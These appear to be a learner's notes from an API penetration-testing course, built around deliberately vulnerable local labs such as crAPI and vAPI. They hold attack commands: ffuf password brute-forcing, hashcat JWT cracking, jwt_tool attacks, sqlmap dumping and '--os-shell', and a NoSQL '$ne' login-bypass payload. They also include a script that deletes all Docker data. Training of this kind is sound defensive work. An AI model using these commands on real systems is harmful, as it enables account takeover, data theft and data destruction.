


### Introduction



### What is an API?

> [!info] 
> API = Application Programming Interface 

![[Pasted image 20230511135500.png]]


### Interacting with APIs

> [!todo] 
> Play around with API
> https://catfact.ninja/ 


### Interacting with APIs

> [!todo] 
> Use this tool to interact with API:
> [Burp Suite](https://portswigger.net/burp/communitydownload)
> [Postman](https://www.postman.com/downloads)
> 

> [!todo] 
> Or with curl:
> `curl https://catfact.ninja/fact -v ` 

![[Pasted image 20230511143315.png]]

### Types of APIs

![[Pasted image 20230511143426.png]]

![[Pasted image 20230511143527.png]]

> [!info] 
> Endpoint is URL which delivery Data
> For Example:  https://catfact.ninja/fact or https://catfact.ninja/breeds

![[Pasted image 20230511143910.png]]


### API Security

> [!warning] 
> Deprecated APIs, particularly if they are not monitored, could be a risk factor.


### Lab Setup

### Tool Installation

> [!todo] 
> Download Postman for Linux:
>  https://www.postman.com/downloads/
>  Extract it and move it to `/opt/`
>  `tar –xvzf postman-linux-x64.tar.gz`
>  `sudo mv Postman /opt/`
>  Link Postman:
>  `sudo ln -s /opt/Postman/Postman /usr/bin/postman`
>  Now just start postman from command line:
>  `postman`

> [!todo] 
> Install & Setup FoxyProxy in Browser (Set IP: 127.0.0.1, Port 8080, Select `http`)
> 

> [!todo] 
> Install Burp Suite  
> Add Burp Certificate in your browser by open `http://burp`
> Import it in Certificate Section in Settings of browser

> [!tip] 
> You can use Firefox and Internal Burp Suite Browser side by side. Like this you can login witht two different user accounts in website to see interaction between two users.
> 


### BURP Suite Introduction

> [!todo] 
> Add Targets to Scope 
> ![[Pasted image 20230511151118.png]]
> ![[Pasted image 20230511151414.png]]

> [!todo] 
> Enable all file types:
> ![[Pasted image 20230511152316.png]]
> ![[Pasted image 20230511151709.png]]

> [!tip] 
> Decode:
> 
> ![[Pasted image 20230511154312.png]]
> 

> [!tip] 
> Comparer:
> 
> ![[Pasted image 20230511154443.png]]

> [!tip] 
> Extensions:
> 
>  ![[Pasted image 20230511154736.png]]


### Postman Introduction

![[Pasted image 20230511160232.png]]

### Docker Introduction


> [!tip] 
>  **Cleaning up your old containers**
>  Will delete all your 

``` 
#!/bin/bash  
sudo docker stop $(sudo docker ps -aq)  
sudo docker rm $(sudo docker ps -aq)  
sudo docker rmi $(sudo docker images -q)  
sudo docker volume rm $(sudo docker volume ls -q)  
sudo docker network rm $(sudo docker network ls -q)
```

> [!todo] 
> Install https://github.com/OWASP/crAPI
> `git clone https://github.com/OWASP/crAPI.git`
> `sudo apt update --fix-missing`
> `sudo apt install docker.io`
 `sudo apt upgrade docker-compose`
 Ensure you use docker-compose 2.x version
> `docker-compose --version`
> `cd ~/labs/crAPI/deploy/docker`
> `sudo docker-compose up`

> [!caution] 
> If there is error, you can try:
>  `docker volume rm docker_postgresql-data`
>  `docker volume rm docker_mongodb-data`

> [!hint] 
> Hosted crAPI:
> https://crapi.samsclass.info/login 
> or
> There is also a hosted version here http://crapi.apisec.ai/ and mailhog is available http://crapi.apisec.ai:8025/

> [!info] 
>  Go to WebApp: http://localhost:8888
>  And MailServer of WebApp: http://localhost:8025/

## Enumerating APIs

### Introduction to Enumeration

> [!abstract] 
> This chapter covers the automated enumeration (fuzzing) API and manual discovery.
> 


### Fuzzing APIs

> [!tip] 
> If you see v2, you can see if there is a v4, v1, v0, beta, stage, or something similiar
> ![[Pasted image 20230513094019.png]] 


> [!todo] 
> Fuzzing with Wordlist:
> 
> ![[Pasted image 20230513094659.png]]
> 

> [!todo] 
> Using wfuzz
>` wfuzz -c -z file,/usr/share/wordlists/dirb/small.txt --sc 200  'http://10.10.153.7:5000/api/v1/resources/books?FUZZ=J.K.`'

### Discovery via Source code

![[Pasted image 20230518110908.png]]

> [!todo] 
> JS Formater:
> https://beautifier.io/ 


## Attacking Authorization

### Introduction to Authorization

![[Pasted image 20230518111524.png]]
https://afteracademy.com/blog/authentication-vs-authorization/


![[Pasted image 20230518111510.png]]


### BOLA Lab

> [!info] 
> Broken Object Level Authorization (BOLA) 

![[Pasted image 20230518112635.png]]

Pass founded UUID in other requests:

![[Pasted image 20230518112715.png]]


### BFLA Lab

> [!note] 
>  To get the vAPI application:
git clone https://github.com/roottusk/vapi
The collection is in the "postman" folder
If you don't have git, you can use:
sudo apt install git

> [!todo] 
> Import Postman collection from vAPI folder. Import both json.
> 

![[Pasted image 20230518142719.png]]


### Challenge Solution

> [!success] 
>  By BOLA solution was right

> [!success] 
>  By BELA solution was almost right. Read better error response. 

> [!hint] 
> Good Blog to subscribe:
>  https://samcurry.net/blog/


## Attacking Authentication

### Introduction to Authentication

> [!info] 
> Common API authentication methods
> - HTTP basic authentication. If a simple form of HTTP authentication is all an app or service requires, HTTP basic authentication might be a good fit. ...
> - API access tokens. ...
> - OAuth with OpenID. ...
> - SAML federated identity. 


### Attacking Authentication

> [!tip] 
> Many Web Apps have a lack of: 
> - Rate Limit
> - Brute Force Protection

> [!todo] 
> Download api-brute-force-demo2.zip 
> sudo docker-compose build
> sudo docker-compose up

> [!todo] 
> Fuzzing via command line:
> 
> ![[Pasted image 20230518173441.png]] 
> 
> `ffuf -request Desktop/req.txt -request-proto http -mc 200 -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt`
> 
> ![[Pasted image 20230518173819.png]]



> [!todo] 
> Find other user :
> `ffuf -request Desktop/req.txt -request-proto http -mr "Invalid password" -w /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt`
> ![[Pasted image 20230521131837.png]]
> `ffuf -request Desktop/req.txt -request-proto http -mc 200 -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt`
> ![[Pasted image 20230521132229.png]]


### Attacking Tokens

> [!todo] 
>  Unzip api-token-analysis
>  `sudo docker-compose build`
>  `sudo docker-compose up`

> [!todo] 
> Login witht admin / ramirez 
> ![[Pasted image 20230521133132.png]]
> console `document.cookie`

> [!todo] 
> Analyse token randomness quality:
> 
> ![[Pasted image 20230521133600.png]] 

> [!todo] 
> Token Decode:
> `echo -n 'YWRtaW4tMTE6Mjk6NTEtZ3pr' | base64 -d` 
> 
> ![[Pasted image 20230521133823.png]]


> [!todo] 
>  Token Analysis
>  ![[Pasted image 20230521134132.png]]
>  `head -n 100 tokens.txt`
>  ![[Pasted image 20230521134939.png]]
>  ![[Pasted image 20230521135104.png]]


> [!todo] 
> TODO, create Token for jeremy:
>  ![[Pasted image 20230521140128.png]]
>  ![[Pasted image 20230521140157.png]]


### JSON Web Tokens - Part 1: Theory

> [!todo] 
> Unzip jwt-demo.zip
>  ``node server.js``

![[Pasted image 20230521140549.png]]

> [!tip] 
> Online Tool: https://jwt.io/
> 

> [!todo] 
> Run:
> `curl -X POST http://localhost/login --header "Content-Type: application/json" --data '{"username": "user", "password": "user"}'` 
> 
> ![[Pasted image 20230521141048.png]]
> `curl -i localhost/dashboard --Header 'Authorization: BEARER TOKEN'`
> ![[Pasted image 20230521142429.png]]
> ![[Pasted image 20230521142638.png]]
> ![[Pasted image 20230521142730.png]]
> Is not working because we don't have secret
> ![[Pasted image 20230521142835.png]]
> ![[Pasted image 20230521143739.png]]


### JSON Web Tokens - Part 2: Attacking JWTs

> [!todo] 
>` hashcat.exe -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNjg0NjcyNzg1fQ.QU20lCyIQeJ_P6QcfOyeZeVXv-DkiKLEBGn1Skv52SI rockyou.txt`
> 
> ![[Pasted image 20230521144304.png]]


### JSON Web Tokens - Part 3: jwt_tool

> [!todo] 
> Install jwt Tool:
> git clone https://github.com/ticarpi/jwt_tool
> `mv jwt_tool /opt/`
> `sudo ln -s /opt/jwt_tool/jwt_tool.py /user/local/sbin/jwt_tool`

![[Pasted image 20230521153236.png]]

> [!todo] 
> `python3 jwt_tool.py -t http://localhost:80/dashboard -rh 'Authorization: BEARER eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiJ1c2VyIiwiaWF0IjoxNjg0NjcxMDAzfQ.80D3mwqxqjMDGF5UqMlFoDXTNKtcZEV7wSfhcmixnt4' -M at` 

![[Pasted image 20230521154446.png]]


![](https://user-images.githubusercontent.com/57728093/68797806-21f25700-064d-11ea-9baa-c58fb6f75c0b.png)

https://github.com/ticarpi/jwt_tool/wiki


![[Pasted image 20230521154854.png]]

![[Pasted image 20230521155022.png]]

![[Pasted image 20230521155251.png]]

### Challenge Solution

![[Pasted image 20230521160643.png]]

![[Pasted image 20230521160709.png]]

![[Pasted image 20230521162251.png]]

![[Pasted image 20230521162435.png]]


## Injection

### Introduction to SQL Injection

![[Pasted image 20230521163630.png]]

![[Pasted image 20230521163729.png]]


### SQL Injection Lab

> [!todo] 
> Download api-injection.zip
> `sudo docker-compose up`
> open localhost:80

![[Pasted image 20230525150324.png]]

![[Pasted image 20230525150436.png]]

![[Pasted image 20230525150806.png]]

> [!tip] 
> Error message often means SQL injection. On production maybe you see default error info and no detail information. 

![[Pasted image 20230525151309.png]]

> [!fail] 
> Not work, error 

![[Pasted image 20230525151619.png]]

> [!info] 
> Union needs same amount of columns, so: 

![[Pasted image 20230525151737.png]]

> [!todo] 
> Using ffuf
> `ffuf -u "http://localhost/v1/001.php?roast=FUZZ" -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt` 

> [!todo] 
> With sqlmap:
> `sqlmap -r Desktop/req.txt  --ignore-code 401` 

![[Pasted image 20230525155722.png]]

![[Pasted image 20230525155851.png]]

> [!todo] 
>  Dump Data:
>  `sqlmap -r Desktop/req.txt. -dump`

![[Pasted image 20230525155952.png]]

> [!todo] 
>  Try to get a shell with sqlmap
>  `sqlmap -r Desktop/req.txt. --ignore-code 401 --os-shell`


### SQL Injection Lab - Login Bypass

![[Pasted image 20230525160449.png]]

![[Pasted image 20230525160501.png]]

![[Pasted image 20230525160734.png]]


### NoSQL Injection Lab

> [!todo] 
> MongoDB
> `monosh`
>  `use demodb`

![[Pasted image 20230525162915.png]]

![[Pasted image 20230525162933.png]]

![[Pasted image 20230525163020.png]]

![[Pasted image 20230525163051.png]]
![[Pasted image 20230525163132.png]]

![[Pasted image 20230525163246.png]]

> [!todo] 
> Go to `api-nosql-injection`  folder
> `sudo docker-compose up`

``` 
/login?username=admin&password[$ne]=asdfasfasf
```

![[Pasted image 20230525164245.png]]

> [!important] 
> More Payloads:
> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
> 

> [!todo] 
> Find SQL Injection in Add Coupon in crAPI:
> ![[Pasted image 20230525165819.png]] 


### Challenge Solution

![[Pasted image 20230525170036.png]]

![[Pasted image 20230525170320.png]]

> [!warning] 
> If you not get any results, deselect Encoding in Burp Suite 

![[Pasted image 20230525170418.png]]

![[Pasted image 20230525170750.png]]


## Mid-course Capstone

### Mid-course Capstone Challenge

> [!todo] 
>  Go to: `~/lab/api-midcourse-capstone`
>  `sudo docker-compose up`


#### Challenge Solution

> [!tip] 
> Always look for injection endpoints (GET / POST etc.)
> 


> [!note] 
> ![[Pasted image 20230611131927.png]]
> Order ID looks weak


> [!note] 
> Take Information from Session ID:
> 
> ![[Pasted image 20230611132238.png]]
> 
> Place Orders on behave of other users
> 


> [!note] 
> Grab JWT Token:
> 
> ![[Pasted image 20230611132430.png]] 
> 
> Change Username and try to use it without valid signature:
> 
> ![[Pasted image 20230611132558.png]]
> 
> Later we can try to do other attacks, like none.
> 
> Place edited token and adjust email:
> 
> ![[Pasted image 20230611132730.png]]
> 
> We made order in behave of other user (# Broken Function Level Authorization): 
> 
> ![[Pasted image 20230611132846.png]]

> [!note] 
> Check for weak  secret:
> 
> HS256 is weak:
> 
> ![[Pasted image 20230611133055.png]]
> 
> ![[Pasted image 20230611133853.png]]


> [!note] 
> FUZZING :
> 
> ![[Pasted image 20230611134716.png]]

> [!note] 
> Information Disclosure (Endpoint with no protection):
> 
> ![[Pasted image 20230611134756.png]] 

> [!note] 
>  Broken Object Level Authorization
>  We can see only with order number a order of other user:
>  ![[Pasted image 20230611135020.png]]


## Mass Assignment

### Introduction to Mass Assignment

> [!info] 
> Modern frameworks allow developers a convenient mass assignment functionality that lets developers directly take a “user-supplied Key-Value Pair” input to the object database. This reduces the requirement of writing code for such custom Key-Value pairs and increases the development efficiency but at the cost of security risks if not implemented correctly. 
> A mass assignment without a whitelist of allowed “Key-Value Pairs” could allow an attacker to use arbitrary values to create or update the resources abusing the applications’ regular workflow. Privilege escalation is one of the most common vulnerabilities arising from Mass Assignment vulnerability. 
> According to OWASPthis [vulnerability](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html) depends on the language/framework in question can have several alternative names:
> - Mass Assignment: Ruby on Rails, NodeJS.
> - Autobinding: Spring MVC, ASP NET MVC.
> - Object injection: PHP.
>   
> For example, consider an API that allows users to update their profile information. The API may accept a JSON payload that contains multiple fields such as name, email, and address. Without proper validation, an attacker can add additional fields such as "isAdmin":true” or "isSuperUser":true and gain elevated privileges as an admin or superuser.
> 
> Source: https://www.cobalt.io/blog/mass-assignment-apis-exploitation-in-the-wild


### Code Walkthrough

> [!todo] 
> Unzip api-mass-assignment.zip

![[Pasted image 20230611142650.png]]

![[Pasted image 20230611142827.png]]

![[Pasted image 20230611142800.png]]


### Mass Assignment Lab

> [!todo] 
>  `sudo docker-compose up`
>  Open: http://localhost:3000/

> [!hint] 
> Mass Assignment to create user with admin rights:
> 
> ![[Pasted image 20230611144941.png]]
> Vulnerable Code:
> ![[Pasted image 20230611145311.png]]
> Fixed Code:
>  ![[Pasted image 20230611145343.png]]

> [!todo] 
> `sudo docker ps -a`
> `sudo docker exec -it d480993b4f41 sh` 
> `mongo`
> `show dbs`
> `use nosqli-demo`
> `show collections`
> `db.users.find()`
> 
> ![[Pasted image 20230611145946.png]]


### Challenge Solution

![[Pasted image 20230617112433.png]]

![[Pasted image 20230617112658.png]]


## Excessive Data Exposure

### Introduction to Excessive Data Exposure

> [!check] 
> Compare API responses with what is actually displayed on the website. See if the API is returning too much information. 

### Excessive Data Exposure Lab

![[Pasted image 20230617115318.png]]

### Challenge Solution

![[Pasted image 20230617115720.png]]

## SSRF - Server-side Request Forgery

### Introduction to SSRF

![[Pasted image 20230617115936.png]]

![[Pasted image 20230617120111.png]]

### SSRF Lab

![[Pasted image 20230617121929.png]]

![[Pasted image 20230617124356.png]]


### Challenge Solution

![[Pasted image 20230617130554.png]]

![[Pasted image 20230617130644.png]]


## Chaining Vulnerabilities

### Command Injection


### Challenge Solution

> [!important] 
> Webhook.site lets you easily inspect, test and automate (with the visual Custom Actions builder, or WebhookScript) any incoming HTTP request or e-mail. What's a webhook?: https://webhook.site 


## Final Capstone


### Final Capstone Challenge

![[Pasted image 20230617140620.png]]

![[Pasted image 20230617141500.png]]


### Challenge Solution

![[Pasted image 20230618151408.png]]

![[Pasted image 20230618151955.png]]

![[Pasted image 20230618152044.png]]

![[Pasted image 20230618151242.png]]

![[Pasted image 20230618151217.png]]

![[Pasted image 20230618151315.png]]

